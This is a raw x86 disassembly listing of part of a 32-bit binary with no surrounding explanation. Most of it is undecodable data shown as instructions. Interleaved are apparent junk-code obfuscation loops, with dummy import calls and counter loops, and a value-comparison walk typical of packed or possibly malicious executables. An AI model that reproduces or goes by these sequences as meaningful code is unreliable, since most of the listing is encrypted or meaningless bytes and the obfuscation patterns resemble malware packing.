  40ea12:	mov    ebx,DWORD PTR [ebx-0x59]
  40ea15:	xchg   ecx,eax
  40ea16:	daa    
  40ea17:	std    
  40ea18:	ror    BYTE PTR [edi+0x79d11b03],0x1d
  40ea1f:	out    0x15,eax
  40ea21:	daa    
  40ea22:	mov    ecx,0x17e3d746
  40ea27:	cmp    al,0x7b
  40ea29:	adc    ecx,DWORD PTR [edi]
  40ea2b:	dec    ecx
  40ea2c:	mov    DWORD PTR [esi-0x1d],ecx
  40ea2f:	add    BYTE PTR [esp+edi*8-0x2354992f],0xac
  40ea37:	dec    esp
  40ea38:	(bad)  
  40ea39:	(bad)  
  40ea3a:	in     eax,dx
  40ea3b:	jecxz  0x40ea47
  40ea3d:	js     0x40ea1a
  40ea3f:	xor    ebx,DWORD PTR fs:[ebx-0x3ea77dec]
  40ea46:	scas   eax,DWORD PTR es:[edi]
  40ea47:	xchg   DWORD PTR [edi],edi
  40ea49:	ret    0xa557
  40ea4c:	jns    0x40eab6
  40ea4e:	sbb    eax,DWORD PTR [ebp-0x619d2a64]
  40ea54:	lds    ecx,FWORD PTR [eax]
  40ea56:	pushf  
  40ea57:	inc    ecx
  40ea58:	aad    0x2d
  40ea5a:	les    esi,FWORD PTR [esi+0x7a]
  40ea5d:	ins    DWORD PTR es:[edi],dx
  40ea5e:	sbb    ecx,edi
  40ea60:	je     0x40ea89
  40ea62:	sti    
  40ea63:	sbb    al,0x11
  40ea65:	push   cs
  40ea66:	outs   dx,BYTE PTR ds:[esi]
  40ea67:	cmp    ch,al
  40ea69:	jge    0x40ea37
  40ea6b:	push   ecx
  40ea6c:	pop    esi
  40ea6d:	out    dx,eax
  40ea6e:	mov    al,ds:0x511dab0f
  40ea73:	dec    eax
  40ea74:	push   ds
  40ea75:	shl    BYTE PTR ds:0xa757f499,1
  40ea7b:	test   ecx,esi
  40ea7d:	call   DWORD PTR [eax-0xfa8a3e0]
  40ea83:	sahf   
  40ea84:	mov    ebp,0x73e2ec24
  40ea89:	adc    ecx,DWORD PTR [esi-0x663870d1]
  40ea8f:	mov    al,ds:0xb94889
  40ea94:	and    edx,DWORD PTR [edx+edi*4-0x10fd732d]
  40ea9b:	mov    ebp,0xba23ab46
  40eaa0:	fs fwait
  40eaa2:	push   0x68
  40eaa4:	or     al,0x8
  40eaa6:	aam    0xd7
  40eaa8:	retf   0x8d90
  40eaab:	scas   al,BYTE PTR es:[edi]
  40eaac:	in     al,0xf9
  40eaae:	xchg   ebx,eax
  40eaaf:	sub    eax,DWORD PTR [eax-0x65d0ce92]
  40eab5:	retf   
  40eab6:	cli    
  40eab7:	jmp    0x40ea3d
  40eab9:	mov    ah,0x98
  40eabb:	mov    edx,0xd48e0a71
  40eac0:	cmp    eax,DWORD PTR [ebx]
  40eac2:	ret    
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    ch,BYTE PTR [edi]
  40ebb4:	cli    
  40ebb5:	mov    edx,DWORD PTR [ecx+0x7e7ea59a]
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ec3e
  40ebc0:	mov    ds:0x922276c1,eax
  40ebc5:	and    DWORD PTR [esp+edx*8-0xc46b936],edi
  40ebcc:	out    0x25,eax
  40ebce:	add    al,0x8c
  40ebd0:	add    bl,BYTE PTR [eax]
  40ebd2:	rol    BYTE PTR [ebp+0x73221545],cl
  40ebd8:	inc    esi
  40ebd9:	xor    esp,ecx
  40ebdb:	pop    ebp
  40ebdc:	in     eax,0xe
  40ebde:	push   cs
  40ebdf:	dec    ebx
  40ebe0:	test   DWORD PTR [edi-0x45],edi
  40ebe3:	adc    DWORD PTR [esi],0x7068c837
  40ebe9:	xor    DWORD PTR [ebx-0x4f9a310d],ebx
  40ebef:	jns    0x40ec09
  40ebf1:	cwde   
  40ebf2:	mov    ds:0x3ac7b16c,eax
  40ebf7:	popf   
  40ebf8:	sar    ah,0x34
  40ebfb:	popf   
  40ebfc:	icebp  
  40ebfd:	sbb    DWORD PTR [edx+0x15],edi
  40ec00:	push   es
  40ec01:	(bad)  
  40ec02:	xor    ebx,DWORD PTR [edi-0x59]
  40ec05:	ret    
  40ec06:	jo     0x40ebfe
  40ec08:	xor    BYTE PTR ds:0xa3c5b63f,dl
  40ec0e:	ins    DWORD PTR es:[edi],dx
  40ec0f:	pop    esp
  40ec10:	jbe    0x40ec1b
  40ec12:	into   
  40ec13:	aam    0x90
  40ec15:	or     eax,0x6ec98af2
  40ec1a:	rol    DWORD PTR [ecx-0x1f4041b5],1
  40ec20:	int3   
  40ec21:	pop    ecx
  40ec22:	(bad)  
  40ec23:	std    
  40ec24:	scas   eax,DWORD PTR es:[edi]
  40ec25:	jbe    0x40ebaf
  40ec27:	shl    DWORD PTR [ebp-0x5c],0x6c
  40ec2b:	inc    esp
  40ec2c:	cmp    edi,ebx
  40ec2e:	daa    
  40ec2f:	and    DWORD PTR [edi+0x53],esp
  40ec32:	fild   DWORD PTR [esi+0x1a]
  40ec35:	push   edi
  40ec36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec37:	gs ss push es
  40ec3a:	fdivr  DWORD PTR [esi+0x51ce612]
  40ec40:	sub    dl,al
  40ec42:	sub    al,al
  40ec44:	fwait
  40ec45:	inc    edx
  40ec46:	jmp    0x40ec42
  40ec48:	jns    0x40ec37
  40ec4a:	test   BYTE PTR [edx],bh
  40ec4c:	stos   DWORD PTR es:[edi],eax
  40ec4d:	pop    ecx
  40ec4e:	mov    ebp,0xd7639270
  40ec53:	clc    
  40ec54:	ret    0x7fc
  40ec57:	sbb    bl,BYTE PTR [eax]
  40ec59:	adc    esi,DWORD PTR [ebp-0x5e674800]
  40ec5f:	push   DWORD PTR [ebx]
  40ec61:	int3   
  40ec62:	loopne 0x40ecb9
  40ec64:	int3   
  40ec65:	cmp    al,0xf8
  40ec67:	in     al,dx
  40ec68:	pop    ebp
  40ec69:	das    
  40ec6a:	add    eax,esp
  40ec6c:	jb     0x40eccf
  40ec6e:	gs ret 
  40ec70:	cdq    
  40ec71:	gs in  al,dx
  40ec73:	retf   
  40ec74:	push   ebp
  40ec75:	xor    DWORD PTR ds:0x6db891ea,edi
  40ec7b:	mov    ecx,0x3d57af40
  40ec80:	cmp    al,0x2f
  40ec82:	or     DWORD PTR [eax],ecx
  40ec84:	jns    0x40ec65
  40ec86:	retf   
  40ec87:	mov    cl,0x11
  40ec89:	fwait
  40ec8a:	xor    DWORD PTR [edi+0x1ad97334],esi
  40ec90:	jnp    0x40ed01
  40ec92:	dec    ecx
  40ec93:	mov    cl,0x37
  40ec95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec96:	fs sub eax,0xa56b677a
  40ec9c:	sub    eax,0x4f725f92
  40eca1:	add    BYTE PTR [ebx],ch
  40eca3:	add    al,0x2b
  40eca5:	inc    esp
  40eca6:	push   ss
  40eca7:	inc    esi
  40eca8:	ds push eax
  40ecaa:	xor    BYTE PTR [ebp+0x232c931f],dh
  40ecb0:	(bad)
  40ecb3:	jo     0x40eca2
  40ecb5:	add    DWORD PTR [ebp-0x26],ecx
  40ecb8:	mov    bh,0x34
  40ecba:	xchg   esp,esi
  40ecbc:	dec    edi
  40ecbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecbe:	pop    ebp
  40ecbf:	ss xchg edx,eax
  40ecc1:	das    
  40ecc2:	jle    0x40ed2e
  40ecc4:	and    BYTE PTR [edx-0x2b],ch
  40ecc7:	inc    edi
  40ecc8:	xor    bl,dl
  40ecca:	mov    ebx,0xc32b7057
  40eccf:	pushf  
  40ecd0:	cmp    edx,eax
  40ecd2:	cdq    
  40ecd3:	xchg   BYTE PTR [edi+eiz*8-0xe1a28ec],bl
  40ecda:	mov    edi,0x1e6aec4b
  40ecdf:	fwait
  40ece0:	sbb    DWORD PTR [edx-0x3c],edi
  40ece3:	add    ebx,ecx
  40ece5:	sbb    al,0xb
  40ece7:	shl    DWORD PTR [eax+0x5f],1
  40ecea:	pop    ecx
  40eceb:	(bad)  
  40ecec:	jmp    0x40ecf8
  40ecee:	sub    esi,DWORD PTR cs:[ebx+0x14]
  40ecf2:	mov    edi,0xde0d114c
  40ecf7:	dec    al
  40ecf9:	cmc    
  40ecfa:	ret    
  40ecfb:	dec    edi
  40ecfc:	repnz sub edi,esi
  40ecff:	mov    esp,0x3354cb32
  40ed04:	je     0x40eca1
  40ed06:	push   ss
  40ed07:	aaa    
  40ed08:	sub    dh,cl
  40ed0a:	idiv   BYTE PTR [edi+esi*4-0x684fb19d]
  40ed11:	adc    DWORD PTR [ecx+0x2],ebp
  40ed14:	xor    bh,dl
  40ed16:	int    0xd5
  40ed18:	sbb    BYTE PTR [esp+edi*2-0x1b],0xaf
  40ed1d:	xor    DWORD PTR [edx],ecx
  40ed1f:	cld    
  40ed20:	idiv   DWORD PTR [esi+0x31]
  40ed23:	lds    ebp,FWORD PTR [ebx-0x78]
  40ed26:	push   ecx
  40ed27:	les    edx,FWORD PTR [ecx+0xb]
  40ed2a:	mov    ah,0x84
  40ed2c:	aad    0x6c
  40ed2e:	fnsave [eax+0x2e]
  40ed31:	ja     0x40ed6e
  40ed33:	lods   eax,DWORD PTR ds:[esi]
  40ed34:	xor    BYTE PTR [edx-0x12ab122],ah
  40ed3a:	adc    esp,ecx
  40ed3c:	inc    edi
  40ed3d:	sbb    cl,BYTE PTR [eax-0x40b9b499]
  40ed43:	sub    edx,0xfad2e791
  40ed49:	cmc    
  40ed4a:	out    0x55,al
  40ed4c:	push   esi
  40ed4d:	jb     0x40edb8
  40ed4f:	arpl   WORD PTR [ecx+0x6cfcc08b],bx
  40ed55:	xor    eax,0xd21661d
  40ed5a:	mov    eax,DWORD PTR [ebx+edi*1]
  40ed5d:	xchg   DWORD PTR [ebp+esi*4-0x911b365],esi
  40ed64:	iret   
  40ed65:	pop    ebx
  40ed66:	mov    cl,0xc2
  40ed68:	push   esp
  40ed69:	adc    ah,bl
  40ed6b:	leave  
  40ed6c:	pop    edx
  40ed6d:	lods   eax,DWORD PTR ds:[esi]
  40ed6e:	test   eax,0xf50adf29
  40ed73:	or     ch,bl
  40ed75:	sub    BYTE PTR [edi+edi*1-0x67479de5],dl
  40ed7c:	(bad)  
  40ed7e:	outs   dx,DWORD PTR ds:[esi]
  40ed7f:	in     al,0x47
  40ed81:	imul   eax,DWORD PTR [ecx+0x61],0x1ec603f4
  40ed88:	in     al,dx
  40ed89:	cmp    ebx,ebp
  40ed8b:	scas   al,BYTE PTR es:[edi]
  40ed8c:	and    eax,0x78a35b99
  40ed91:	daa    
  40ed92:	pop    ss
  40ed93:	out    dx,al
  40ed94:	jmp    0x40ee03
  40ed96:	jnp    0x40edce
  40ed98:	push   eax
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x433653
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x10419f7f]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	enter  0x5197,0x57
  40ee7a:	call   0xe432:0xfd917925
  40ee81:	inc    ebx
  40ee82:	ins    BYTE PTR es:[edi],dx
  40ee83:	add    al,0xa0
  40ee85:	les    ebp,FWORD PTR [ecx+eax*2]
  40ee88:	popa   
  40ee89:	sbb    edi,edx
  40ee8b:	rcl    bl,0x29
  40ee8e:	std    
  40ee8f:	rcl    BYTE PTR [ebx+0x26],1
  40ee92:	pushaw 
  40ee94:	jle    0x40ee2a
  40ee96:	fxch   st(3)
  40ee98:	int    0x3d
  40ee9a:	add    al,0x32
  40ee9c:	ins    BYTE PTR es:[edi],dx
  40ee9d:	int    0xfa
  40ee9f:	push   ecx
  40eea0:	scas   al,BYTE PTR es:[edi]
  40eea1:	or     esp,DWORD PTR [edi]
  40eea3:	jno    0x40ee50
  40eea5:	jno    0x40eeee
  40eea7:	sar    DWORD PTR [esi*4-0x55dcd4ad],cl
  40eeae:	mov    ch,0x17
  40eeb0:	mov    ebx,0x18af6e44
  40eeb5:	dec    ebx
  40eeb6:	xchg   edi,eax
  40eeb7:	stos   BYTE PTR es:[edi],al
  40eeb8:	addr16 out dx,al
  40eeba:	sbb    DWORD PTR [ecx+0x5cf660b9],ebx
  40eec0:	in     eax,0x4d
  40eec2:	push   edi
  40eec3:	and    DWORD PTR [ebp+0x71a1f7e9],ecx
  40eec9:	leave  
  40eeca:	dec    eax
  40eecb:	addr16 iret 
  40eecd:	mov    ebp,0xdd2a2697
  40eed2:	(bad)  
  40eed4:	pop    ebx
  40eed5:	in     al,0x69
  40eed7:	or     DWORD PTR [ebx],ecx
  40eed9:	mov    fs,WORD PTR [ebx-0xbd5ff5a]
  40eedf:	gs popf 
  40eee1:	xlat   BYTE PTR ds:[ebx]
  40eee2:	or     DWORD PTR [eax],ecx
  40eee4:	data16 je 0x40eee1
  40eee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eee8:	inc    edx
  40eee9:	out    0xc2,eax
  40eeeb:	sub    DWORD PTR [ecx],0x25
  40eeee:	ja     0x40ef3b
  40eef0:	pop    edi
  40eef1:	cs jge 0x40ef2c
  40eef4:	stos   BYTE PTR es:[edi],al
  40eef5:	dec    ecx
  40eef6:	addr16 xchg edx,eax
  40eef8:	push   0xffffffc3
  40eefa:	xor    DWORD PTR [edi+edx*1],edx
  40eefd:	mov    ah,0xf
  40eeff:	out    dx,al
  40ef00:	jne    0x40eecb
  40ef02:	or     eax,0x3a65d8da
  40ef07:	nop
  40ef08:	out    dx,eax
  40ef09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef0a:	or     DWORD PTR [ecx-0x50],edi
  40ef0d:	jge    0x40ef0d
  40ef0f:	sub    eax,0xbd3703e7
  40ef14:	or     DWORD PTR [edi+0xe],0xd8bc39b2
  40ef1b:	or     al,0xf0
  40ef1d:	fidiv  DWORD PTR [ecx-0x44]
  40ef20:	lods   eax,DWORD PTR ds:[esi]
  40ef21:	aad    0xb9
  40ef23:	ins    BYTE PTR es:[edi],dx
  40ef24:	retf   0x68df
  40ef27:	pop    ecx
  40ef28:	xor    DWORD PTR [ecx],eax
  40ef2a:	pop    eax
  40ef2b:	inc    esp
  40ef2c:	test   al,0x4f
  40ef2e:	and    edi,DWORD PTR [esi+0x1f496d8c]
  40ef34:	mov    ebx,fs
  40ef36:	pop    ss
  40ef37:	int    0x1a
  40ef39:	dec    ecx
  40ef3a:	retf   
  40ef3b:	into   
  40ef3c:	out    dx,eax
  40ef3d:	fistp  QWORD PTR [esi]
  40ef40:	pop    edi
  40ef41:	adc    ah,dl
  40ef43:	daa    
  40ef44:	pop    ebp
  40ef45:	(bad)  
  40ef46:	(bad)  
  40ef47:	mov    bl,0x8e
  40ef49:	into   
  40ef4a:	push   es
  40ef4b:	xchg   ebp,eax
  40ef4c:	sub    ah,ah
  40ef4e:	ret    
  40ef4f:	outs   dx,DWORD PTR ds:[esi]
  40ef50:	lock ret 
  40ef52:	jl     0x40ef5c
  40ef54:	int    0x96
  40ef56:	cdq    
  40ef57:	test   al,0xb5
  40ef59:	mov    ecx,0x2d2c98d7
  40ef5e:	int3   
  40ef5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef60:	mov    bl,0xe3
  40ef62:	and    esp,DWORD PTR [eax+0x4e715ee4]
  40ef68:	jg     0x40ef30
  40ef6a:	pushf  
  40ef6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef6c:	xchg   bh,bl
  40ef6e:	inc    ebx
  40ef6f:	repnz retf 
  40ef71:	in     eax,0x16
  40ef73:	sub    BYTE PTR [ecx-0x719b5650],dh
  40ef79:	rcr    DWORD PTR [ebx-0x6a9d98af],1
  40ef7f:	push   ebx
  40ef80:	xlat   BYTE PTR ds:[ebx]
  40ef81:	pop    ebx
  40ef82:	inc    ebx
  40ef83:	aam    0x6f
  40ef85:	and    esi,eax
  40ef87:	cmp    al,0x82
  40ef89:	jns    0x40ef73
  40ef8b:	fs test al,0x1e
  40ef8e:	lahf   
  40ef8f:	push   ecx
  40ef90:	mov    eax,ds:0x5463b2d4
  40ef95:	pop    ss
  40ef96:	push   ebp
  40ef97:	es mov ecx,0x274a17dd
  40ef9d:	mov    ch,0x43
  40ef9f:	push   esi
  40efa1:	gs sbb al,0xe5
  40efa4:	mov    dl,bl
  40efa6:	scas   al,BYTE PTR es:[edi]
  40efa7:	sub    eax,0x4e9e999
  40efac:	sbb    ebx,DWORD PTR [eax+0x50]
  40efaf:	fcmovu st,st(3)
  40efb1:	es cli 
  40efb3:	jo     0x40f027
  40efb5:	add    eax,0x33355a1
  40efba:	inc    ebx
  40efbb:	push   es
  40efbc:	push   0xf71f9861
  40efc1:	fdivr  DWORD PTR [ecx+0x9]
  40efc4:	jno    0x40efa8
  40efc6:	sub    BYTE PTR [esi+0x1a0075a2],bl
  40efcc:	pop    ss
  40efcd:	sti    
  40efce:	mov    esp,0xd1062a1b
  40efd3:	cmc    
  40efd4:	inc    esi
  40efd5:	lock or DWORD PTR [eax+0x63],0x497ac570
  40efdd:	inc    edi
  40efde:	sub    bl,cl
  40efe0:	sub    ebp,DWORD PTR [eax-0x77]
  40efe3:	mov    ch,0x71
  40efe5:	mov    dh,0x3b
  40efe7:	mov    bh,0x83
  40efe9:	loope  0x40ef88
  40efeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efec:	add    al,0x56
  40efee:	fdiv   QWORD PTR [ebx+0x666b971c]
  40eff4:	add    ebp,DWORD PTR [edi-0x6c]
  40eff7:	push   ds
  40eff8:	mov    BYTE PTR [edx+0x3c],ch
  40effb:	mov    dh,0x14
  40effd:	inc    esi
  40effe:	push   0x7f
  40f000:	or     DWORD PTR [edi+0x7b],eax
  40f003:	mov    eax,0xeb24950f
  40f008:	call   0x80f5e4b0
  40f00d:	xchg   DWORD PTR [ecx+0x1f],ebx
  40f010:	cmc    
  40f011:	retf   0xf9d8
  40f014:	push   es
  40f015:	stos   BYTE PTR es:[edi],al
  40f016:	stos   DWORD PTR es:[edi],eax
  40f017:	sbb    eax,esi
  40f019:	cld    
  40f01a:	mov    ch,0x63
  40f01c:	add    DWORD PTR [edi],edi
  40f01e:	jmp    0x40f05c
  40f020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f021:	xor    eax,0x8f8b0199
  40f026:	in     eax,0xc8
  40f028:	daa    
  40f029:	call   0x1cb9500e
  40f02e:	addr16 xchg edx,eax
  40f030:	outs   dx,BYTE PTR ds:[esi]
  40f031:	test   BYTE PTR [edx+0x324489cc],al
  40f037:	inc    esp
  40f038:	or     DWORD PTR [ebx-0x49],edi
  40f03b:	mov    esi,0x164116ba
  40f040:	icebp  
  40f041:	push   0x26f49f31
  40f046:	mov    WORD PTR [eax+0x733c8f17],fs
  40f04c:	jmp    0xc45:0x8b6826e8
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x7cfa1594,ebx
  40f076:	cmp    al,BYTE PTR [edi-0x2a]
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	cmp    bh,0xbd
  40f083:	xor    bl,bl
  40f085:	mov    ebx,DWORD PTR [esi]
  40f087:	jb     0x40f0e6
  40f089:	jnp    0x40f0fe
  40f08b:	xchg   edx,eax
  40f08c:	cmp    ch,al
  40f08e:	sub    eax,0xb32d5b2d
  40f093:	jae    0x40f07e
  40f095:	mov    eax,edi
  40f097:	xchg   edi,eax
  40f098:	das    
  40f099:	in     eax,0xa6
  40f09b:	repnz ins BYTE PTR es:[edi],dx
  40f09d:	xchg   ebx,eax
  40f09e:	xchg   DWORD PTR [ebp-0x285639bb],esp
  40f0a4:	cmc    
  40f0a5:	test   al,0x9a
  40f0a7:	pusha  
  40f0a8:	rcl    BYTE PTR [ebx+0x46],0xf5
  40f0ac:	hlt    
  40f0ad:	ins    DWORD PTR es:[edi],dx
  40f0ae:	add    al,0x42
  40f0b0:	loope  0x40f04d
  40f0b2:	rcr    DWORD PTR [edi-0x2f],0xf7
  40f0b6:	outs   dx,BYTE PTR ds:[esi]
  40f0b7:	push   es
  40f0b8:	xor    DWORD PTR [edi+0x4ea4a78a],esp
  40f0be:	loop   0x40f0d2
  40f0c0:	sub    al,0xb4
  40f0c2:	loope  0x40f113
  40f0c4:	push   eax
  40f0c5:	or     al,0x7
  40f0c7:	push   eax
  40f0c8:	leave  
  40f0c9:	mov    bl,BYTE PTR [ebx+0x4b]
  40f0cc:	mov    cl,0x2a
  40f0ce:	add    dh,dl
  40f0d0:	mov    ds:0x274f43c3,al
  40f0d5:	mov    BYTE PTR [eax+0x63],ah
  40f0d8:	sub    al,0xc2
  40f0da:	jmp    0xb98283a2
  40f0df:	jmp    0x40f07f
  40f0e1:	std    
  40f0e2:	int    0x2b
  40f0e4:	xchg   ebx,eax
  40f0e5:	mov    eax,ds:0x3c46f6da
  40f0ea:	cdq    
  40f0eb:	pop    eax
  40f0ec:	mov    bh,0x4
  40f0ee:	and    eax,0xedbb6057
  40f0f3:	cmp    BYTE PTR [ecx+0x27],bl
  40f0f6:	xor    ebp,ecx
  40f0f8:	mov    edx,0x7501830e
  40f0fd:	xchg   esp,eax
  40f0fe:	jmp    0x7b6a6d84
  40f103:	enter  0xd221,0xd9
  40f107:	add    al,0x38
  40f109:	stc    
  40f10a:	jb     0x40f0ad
  40f10c:	push   ss
  40f10d:	loopne 0x40f182
  40f10f:	jnp    0x40f0bf
  40f111:	push   es
  40f112:	imul   ebp,DWORD PTR [esi+0x66],0x9df80240
  40f119:	stos   BYTE PTR es:[edi],al
  40f11a:	stos   BYTE PTR es:[edi],al
  40f11b:	sbb    DWORD PTR [ebx],esi
  40f11d:	(bad)  
  40f11e:	fsub   DWORD PTR [esi+ecx*4]
  40f121:	outs   dx,BYTE PTR ds:[esi]
  40f122:	ja     0x40f0c5
  40f124:	push   esp
  40f125:	test   al,0xc1
  40f127:	push   ss
  40f128:	and    ebx,DWORD PTR [edi+0x22dd153b]
  40f12e:	or     al,0xbd
  40f130:	cld    
  40f131:	xchg   ecx,eax
  40f132:	or     edx,ebp
  40f134:	xor    edi,ecx
  40f136:	iret   
  40f137:	das    
  40f138:	adc    BYTE PTR [edx-0x5fcd6829],0xd8
  40f13f:	adc    DWORD PTR [ecx+eax*4+0x7d91e9d3],ecx
  40f146:	test   BYTE PTR [eax+esi*1],dh
  40f149:	in     al,0xb4
  40f14b:	retf   
  40f14c:	add    cl,BYTE PTR [ecx+0x61461cb9]
  40f152:	xor    al,0xd3
  40f154:	mov    ah,0xa
  40f156:	sbb    ecx,esp
  40f158:	popa   
  40f159:	jecxz  0x40f1a2
  40f15b:	(bad)  
  40f15c:	push   ebx
  40f15d:	hlt    
  40f15e:	and    eax,0xab45f976
  40f163:	int3   
  40f164:	clc    
  40f165:	iret   
  40f166:	(bad)  
  40f168:	fistp  DWORD PTR [edx]
  40f16a:	mov    edi,0x9bd0c076
  40f16f:	pop    edx
  40f170:	fstp   QWORD PTR [ebx-0x352a7b62]
  40f176:	mov    eax,0xc6bb9468
  40f17b:	cli    
  40f17c:	cmp    eax,0xcbe7fffd
  40f181:	xchg   edi,eax
  40f182:	jmp    0x40f17d
  40f184:	test   DWORD PTR [edi+0x20fe8add],ebx
  40f18a:	sbb    BYTE PTR [eax-0x53],cl
  40f18d:	call   0x37f8:0xa9ebf7f7
  40f194:	cwde   
  40f195:	and    DWORD PTR [edi-0x76ef130e],ebx
  40f19b:	pop    esi
  40f19c:	mov    eax,ds:0x7bd5153d
  40f1a1:	cs sbb eax,0xe8626b9f
  40f1a7:	out    0x25,eax
  40f1a9:	adc    eax,0xe7de09d2
  40f1ae:	out    0xf7,al
  40f1b0:	and    esp,eax
  40f1b2:	(bad)  
  40f1b4:	lods   eax,DWORD PTR ds:[esi]
  40f1b5:	push   eax
  40f1b6:	inc    eax
  40f1b7:	arpl   WORD PTR [ecx],di
  40f1b9:	xlat   BYTE PTR ds:[ebx]
  40f1ba:	fcomp  QWORD PTR [eax-0x1c]
  40f1bd:	mov    ch,0x2c
  40f1bf:	inc    ecx
  40f1c0:	sub    ebp,ecx
  40f1c2:	idiv   DWORD PTR [ebp+ecx*2+0x417de20e]
  40f1c9:	sub    al,0x4
  40f1cb:	xor    bh,BYTE PTR [ebx-0x66]
  40f1ce:	xor    eax,DWORD PTR [ecx+ebp*2]
  40f1d1:	fidiv  DWORD PTR [esi-0x36]
  40f1d4:	push   cs
  40f1d5:	mov    esp,ebp
  40f1d7:	cld    
  40f1d8:	aas    
  40f1d9:	inc    BYTE PTR [eax-0x7d]
